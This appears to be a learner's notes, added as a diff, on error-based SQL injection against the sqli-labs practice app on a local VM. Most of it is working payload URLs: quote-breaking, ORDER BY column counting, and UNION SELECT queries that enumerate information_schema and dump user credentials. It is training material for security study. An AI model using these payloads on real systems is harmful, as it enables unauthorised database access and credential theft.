@@ -1,0 +1,108 @@
+Error based sql injection
+
+STEP 1: Fuzzing
+ in the parameters insert strings, alphaneumaric, long integers, small integers, special characters(',")
+ 
+Step 2: After identifing the parameters 
+ in this step, try to complete the querry to remove the error
+ select login_name,password from table where id = '1' --+ '
+ 
+Step 3: Evaluating the condition 
+ in this step before commenting out the right part we can evaluate the statement
+ select & from table where id = '1 ' AND 1=1 --+ '
+ 
+NOTE: Above 3 steps are basically used to understand the logic of the querry written by the developer.
+
+		Lets say we have the below 3 errors from above 3 steps: 
+
+		1.  URL (http://ubuntuvm/sqli-labs/Less-1/?id=1')
+		You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1  
+					
+		 ---->>> IN THIS WE ARE INTERESTED ''1'' LIMIT 0,1' at line 1
+		 ---->>> '   '1' '     LIMIT 0,1'
+		 ---->>> ' 1 ' <sql injection space>    --+           '
+		From the above point we can confirm that the developer might be using querry like [select login_name,password from table where id = ' our input ' ] i.e he is using single                 quotes wrapping our input 
+		The above querry will nullify the error as our input(1') completed the query and we insert --+ to comment out the rest of the querry.
+					 
+					 
+		2. URL (http://ubuntuvm/sqli-labs/Less-2/?id=1')
+		You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1
+					
+		 ----->>> we are interested in '' LIMIT 0,1' at line 1
+		 ----->>> '   '   LIMIT 0,1  '
+		 ----->>> 1<sql injection space>  --+
+		 From the above point we can confirm that the developer might be using a querry like [select login_name,password from table where id = our input] i.e he is using our input as                  is in his querry.
+		 
+		3. URL (http://ubuntuvm/sqli-labs/Less-3/?id=1')
+		You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1
+		
+		 ----->>> WE are interested in ''1'') LIMIT 0,1' at line 1
+		 ----->>> '    '1'') LIMIT 0,1    ' at line 1
+		 ----->>> ' 1'  ')
+		 ----->>> ' 1') <sql injection space> --+ ')
+		 From the above point we can confirm that the developer might be using querry like [select login_name,password from tavle where id = ('our input')] i.e he is using ('')                  wrapping our input.
+		 
+		4. URL (http://ubuntuvm/sqli-labs/Less-4/?id=1")
+		You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"1"") LIMIT 0,1' at line 1
+		
+		 ----->>> We are interested in '"1"") LIMIT 0,1' at line 1
+		 ----->>> '   "1"") LIMIT 0,1    '
+		 ----->>> "  1"  ")
+		 ----->>> " 1")<sql injection here>  --+
+		 From the above point we can confirm that the developer might be using querry like [select login_name,password from tavle where id = ("our input")] i.e
+		 he is using ("") wrapping our input
+		 
+
+STEP 4: In the sql injection field, before we comment out the rest of the querry, we can use the order by N to know the number of columns used in the querry.
+
+		eg: http://ubuntuvm/sqli-labs/Less-4/?id=1" order by N --+
+		
+STEP 5: After enumerating number of columns we can we can run sql querries using UNION clause.
+
+		eg: http://ubuntuvm/sqli-labs/Less-4/?id=9999999" Union select 1,2,3,..,N --+
+		
+		In the above example we purposefully put a wrong id number(like 999999 which dosent exist) so that our Union select querry runs.
+		
+STEP 6: Its time to have some fun now!!! In the above step we also get to know the number of columns vulnerable. 
+		We will use the system database information_schema to get the details of other databases of the application under scope.
+		
+		information_schema ---->> information_schema.tables ----->> table_name
+		
+		
+		For enumerating table names of the target database:   select table_name from information_schema.tables where table_schema="<name of database found>"
+		
+		eg: http://ubuntuvm/sqli-labs/Less-4/?id=99999" Union select 1,table_name,3 from information_schema.tables where table_schema='<name of database>' limit 1,1--+
+		
+		eg: http://ubuntuvm/sqli-labs/Less-4/?id=99999" Union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 2,1 --+
+		NOTE : the limit function is use to iterate for more enties in the table.
+		
+		eg: http://ubuntuvm/sqli-labs/Less-4/?id=99999" Union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
+		
+		
+		For enumerating column names from the tables found above.
+		
+		eg: http://ubuntuvm/sqli-labs/Less-4/?id=99999" union select 1,group_concat(column_name),3 from information_schema.columns where table_name='<name of the table found above>' --+
+		
+		After enumerating all tables and columns inside it, we can simply dump data using following querry:
+		
+		http://ubuntuvm/sqli-labs/Less-4/?id=99999" union select 1,group_concat(<column name enumerated>) from <table name enumerated>
+		
+		
+		
+		Case study:
+		Lets say table names are emails,referers,uagents,users
+		
+		Column names in emails is id,email_id
+		
+		Column names in table referers is id,referer,ip_address
+		
+		column names in table uagents is id,uagent,ip_address,username
+		
+		Column names in table users can be found out using querry http://ubuntuvm/sqli-labs/Less-4/?id=99999%22)%20Union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=%27users%27%20--+  which gives us result as id,username,password
+		
+		DUMPING DATA
+		http://ubuntuvm/sqli-labs/Less-4/?id=99999") UNION select 1,group_concat(<column name found>),3 from <table name found>
+		
+		
+		
+	    	
